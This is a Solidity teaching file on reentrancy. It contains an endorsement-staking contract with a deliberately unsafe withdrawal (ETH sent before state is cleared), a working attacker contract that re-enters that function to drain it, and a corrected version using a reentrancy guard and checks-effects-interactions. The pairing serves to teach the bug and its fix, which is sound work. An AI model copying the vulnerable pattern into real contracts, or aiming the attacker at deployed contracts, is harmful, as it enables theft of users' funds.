// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*
 *  EKEYx(Y) – Endorsement Key from X to Y
 *
 *  This single Solidity file contains:
 *
 *  1) EKEYxY          – vulnerable endorsement registry (reentrancy bug)
 *  2) EKEYxYAttacker  – attacker that exploits the bug
 *  3) EKEYxYDefense   – secure version with nonReentrant + CEI
 *
 *  Concept:
 *    - X endorses Y by calling endorse(Y) and staking ETH.
 *    - Later X can revoke the endorsement and get the stake back.
 *    - In the vulnerable version, revokeEndorsement() is reentrancy-unsafe.
 */


/* ============================================================= */
/*                1. VULNERABLE EKEYxY REGISTRY                  */
/* ============================================================= */

contract EKEYxY {
    struct Endorsement {
        uint256 stake; // ETH staked as endorsement weight
        bool active;
    }

    // Mapping: endorser (X) => subject (Y) => endorsement info
    mapping(address => mapping(address => Endorsement)) public endorsements;

    event Endorsed(address indexed endorser, address indexed subject, uint256 amount);
    event Revoked(address indexed endorser, address indexed subject, uint256 amount);

    /// @notice Endorse subject Y by staking ETH.
    ///         EKEYx(Y) is represented as endorsements[msg.sender][Y].
    function endorse(address subject) external payable {
        require(subject != address(0), "Invalid subject");
        require(msg.value > 0, "No ETH sent");

        Endorsement storage e = endorsements[msg.sender][subject];

        // Allow topping up an existing endorsement
        e.stake += msg.value;
        e.active = true;

        emit Endorsed(msg.sender, subject, msg.value);
    }

    /// @notice Revoke EKEYx(Y) and withdraw staked ETH back to X.
    /// @dev VULNERABLE: external call (send) happens BEFORE state is updated.
    function revokeEndorsement(address subject) external {
        Endorsement storage e = endorsements[msg.sender][subject];
        require(e.active, "Not active");
        require(e.stake > 0, "Nothing to withdraw");

        uint256 amount = e.stake;

        // ❌ VULNERABLE PATTERN:
        // External call before state change → reentrancy bug.
        (bool ok, ) = payable(msg.sender).call{value: amount}("");
        require(ok, "Send failed");

        // State is updated AFTER sending
        e.stake = 0;
        e.active = false;

        emit Revoked(msg.sender, subject, amount);
    }

    /// @notice Simple view for remaining stake of EKEYx(Y).
    function getStake(address endorser, address subject) external view returns (uint256) {
        return endorsements[endorser][subject].stake;
    }
}


/* ============================================================= */
/*                     2. ATTACKER CONTRACT                      */
/* ============================================================= */

contract EKEYxYAttacker {
    EKEYxY public target;
    address public owner;
    address public subject; // Y used in EKEYx(Y)
    bool internal attacking;

    event AttackStarted(address indexed attacker, uint256 initialDeposit);
    event AttackStep(address indexed attacker, uint256 targetBalance, uint256 attackerBalance);
    event AttackFinished(address indexed attacker, uint256 totalDrained);

    constructor(address _target, address _subject) {
        target = EKEYxY(_target);
        owner = msg.sender;
        subject = _subject;
    }

    /// @notice Begin the reentrancy attack against EKEYxY.revokeEndorsement().
    /// @dev You send some ETH; we endorse subject and then revoke to drain.
    function beginAttack() external payable {
        require(msg.sender == owner, "Not owner");
        require(msg.value > 0, "Need ETH to attack");

        // 1) Create EKEYx(Y) by endorsing with ETH
        target.endorse{value: msg.value}(subject);

        emit AttackStarted(owner, msg.value);

        // 2) Flag we are in attacking mode, then revoke
        attacking = true;
        target.revokeEndorsement(subject);
        attacking = false;

        // 3) Send all stolen ETH back to owner
        uint256 balance = address(this).balance;
        if (balance > 0) {
            (bool ok, ) = payable(owner).call{value: balance}("");
            require(ok, "Payout failed");
        }

        emit AttackFinished(owner, balance);
    }

    /// @notice Fallback/receive is triggered when target sends ETH.
    ///         Because target updates its state AFTER send, we can reenter
    ///         revokeEndorsement() and withdraw the same stake multiple times.
    receive() external payable {
        emit AttackStep(owner, address(target).balance, address(this).balance);

        if (attacking && address(target).balance > 0) {
            // Reenter the vulnerable function
            target.revokeEndorsement(subject);
        }
    }
}


/* ============================================================= */
/*                3. SECURE EKEYxYDefense VERSION                */
/* ============================================================= */

contract EKEYxYDefense {
    struct Endorsement {
        uint256 stake;
        bool active;
    }

    mapping(address => mapping(address => Endorsement)) public endorsements;

    bool private locked; // simple reentrancy guard

    event Endorsed(address indexed endorser, address indexed subject, uint256 amount);
    event Revoked(address indexed endorser, address indexed subject, uint256 amount);

    modifier nonReentrant() {
        require(!locked, "Reentrancy");
        locked = true;
        _;
        locked = false;
    }

    /// @notice Endorse subject Y by staking ETH (safe version).
    function endorse(address subject) external payable {
        require(subject != address(0), "Invalid subject");
        require(msg.value > 0, "No ETH sent");

        Endorsement storage e = endorsements[msg.sender][subject];

        e.stake += msg.value;
        e.active = true;

        emit Endorsed(msg.sender, subject, msg.value);
    }

    /// @notice Safely revoke EKEYx(Y) and withdraw staked ETH.
    /// @dev FIXED:
    ///       - Uses nonReentrant
    ///       - Uses Checks-Effects-Interactions (update state BEFORE send)
    function revokeEndorsement(address subject) external nonReentrant {
        Endorsement storage e = endorsements[msg.sender][subject];
        require(e.active, "Not active");
        require(e.stake > 0, "Nothing to withdraw");

        uint256 amount = e.stake;

        // ✅ EFFECTS: update state BEFORE external interaction
        e.stake = 0;
        e.active = false;

        // ✅ INTERACTION: external call after state change
        (bool ok, ) = payable(msg.sender).call{value: amount}("");
        require(ok, "Send failed");

        emit Revoked(msg.sender, subject, amount);
    }

    function getStake(address endorser, address subject) external view returns (uint256) {
        return endorsements[endorser][subject].stake;
    }
}
